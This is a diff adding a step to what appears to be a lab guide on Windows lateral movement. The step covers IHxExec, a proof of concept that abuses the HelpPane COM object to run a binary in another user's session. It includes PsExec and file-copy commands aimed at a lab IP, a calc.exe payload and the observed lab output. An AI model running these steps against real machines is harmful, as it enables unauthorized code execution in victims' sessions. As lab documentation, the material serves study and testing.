@@ -103,3 +103,37 @@ sc \\10.110.0.101 start RemoteRegistry
 ```
 
 **Note:** When using PsExec to run a local PoC already on the target, Remote Registry is less critical. It becomes essential for remote COM hijack + SpeechRuntimeMove-style attacks.
+
+---
+
+## Step 4: IHxExec (HelpPane PoC)
+
+**What it does:**  
+IHxExec uses the IHxHelpPaneServer COM object (`RunAs = Interactive User`) to perform Cross-Session Activation. It calls `SetSessionId` then activates the COM class in the target session and invokes `Execute()` to run an arbitrary binary in the victim user’s context.
+
+**Transfer to victim machine:**  
+Copy IHxExec.exe to the target (e.g. `C:\Temp\IHxExec.exe`).
+
+```bash
+copy IHxExec.exe \\10.110.0.101\C$\Temp\
+```
+
+**Execute with admin privileges (from attacker via PsExec):**
+```bash
+psexec \\10.110.0.101 -accepteula -s C:\Temp\IHxExec.exe -s <SessionID> -c C:\Windows\System32\calc.exe
+```
+
+**Example (Session 3 = victim Active session):**
+```bash
+psexec \\10.110.0.101 -accepteula -s C:\Temp\IHxExec.exe -s 3 -c C:\Windows\System32\calc.exe
+```
+
+**Expected result:**  
+`calc.exe` launches on the **victim machine** under the **victim user’s session** (visible on the victim desktop). Exit code 0 indicates success.
+
+**Lab observation:**  
+When the correct Active Session ID was used, output showed:
+```
+[+] Executing binary: file:///C:\Windows\System32\calc.exe
+error code 0
+```
